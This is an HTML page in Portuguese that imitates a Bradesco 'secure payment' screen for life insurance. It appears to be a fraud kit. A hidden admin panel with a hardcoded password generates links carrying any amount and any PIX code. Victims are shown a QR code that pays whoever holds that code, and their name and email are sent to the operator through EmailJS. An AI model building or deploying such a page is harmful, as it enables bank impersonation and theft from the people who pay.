<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Pagamento Seguro</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>
body {
    font-family: Arial;
    background: #f4f6f9;
    margin: 0;
}

.header {
    background: linear-gradient(90deg, #cc092f, #a30726);
    padding: 18px;
    text-align: center;
}

.logo-text {
    color: white;
    font-size: 26px;
    font-weight: bold;
}

.container {
    max-width: 400px;
    margin: 30px auto;
    background: white;
    padding: 25px;
    border-radius: 18px;
    text-align: center;
}

.valor {
    font-size: 30px;
    color: #cc092f;
    font-weight: bold;
}

button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border-radius: 10px;
    border: none;
    background: #cc092f;
    color: white;
}

input, textarea {
    width: 100%;
    margin-top: 8px;
    padding: 10px;
}

.hidden { display:none; }
</style>
</head>

<body>

<div class="header">
    <div class="logo-text">Bradesco</div>
</div>

<!-- CLIENTE -->
<div class="container" id="cliente">

    <div>🔒 Pagamento Seguro</div>

    <h3>Seguro de Vida</h3>

    <div class="valor" id="valor">R$ 0,00</div>

    <div id="qr"></div>

    <button onclick="copiar()">Copiar código PIX</button>

    <textarea id="codigoPix" readonly></textarea>

    <h4>Já realizou o pagamento?</h4>

    <input id="nome" placeholder="Seu nome">
    <input id="email" placeholder="Seu email">

    <button onclick="enviar()">Confirmar pagamento</button>

    <div id="msg"></div>

</div>

<!-- ADMIN -->
<div class="container hidden" id="admin">
    <h3>Admin</h3>

    <input id="valorInput" placeholder="Valor">
    <input id="pixInput" placeholder="Código PIX">

    <button onclick="gerar()">Gerar link</button>

    <p id="link"></p>
</div>

<script>
const SENHA = "153319";

/* EMAILJS INIT */
(function(){
    emailjs.init("SUA_PUBLIC_KEY"); // 🔴 TROCAR
})();

/* ADMIN */
if(location.pathname=="/admin"){
    let s = prompt("Senha:");
    if(s===SENHA){
        admin.classList.remove("hidden");
        cliente.style.display="none";
    } else {
        alert("Sem acesso");
    }
}

/* GERAR LINK */
function gerar(){
    let valor = valorInput.value;
    let pix = pixInput.value;

    let linkFinal = location.origin + "/?valor="+valor+"&pix="+encodeURIComponent(pix);

    link.innerText = linkFinal;
}

/* CARREGAR */
function carregar(){
    let p = new URLSearchParams(location.search);

    let valor = p.get("valor");
    let pix = p.get("pix");

    if(!valor || !pix) return;

    document.getElementById("valor").innerText = "R$ "+valor;
    codigoPix.value = pix;

    window.pix = pix;

    new QRCode(qr, {text:pix,width:200,height:200});
}

/* COPIAR */
function copiar(){
    navigator.clipboard.writeText(window.pix);
    alert("Copiado!");
}

/* ENVIAR EMAIL */
function enviar(){

    let nome = document.getElementById("nome").value;
    let email = document.getElementById("email").value;

    if(!nome || !email){
        alert("Preencha os dados");
        return;
    }

    emailjs.send("SEU_SERVICE_ID","SEU_TEMPLATE_ID",{
        nome: nome,
        email: email,
        valor: document.getElementById("valor").innerText
    }).then(()=>{
        msg.innerText = "Pagamento enviado para análise!";
    },()=>{
        msg.innerText = "Erro ao enviar!";
    });
}

carregar();
</script>

</body>
</html>
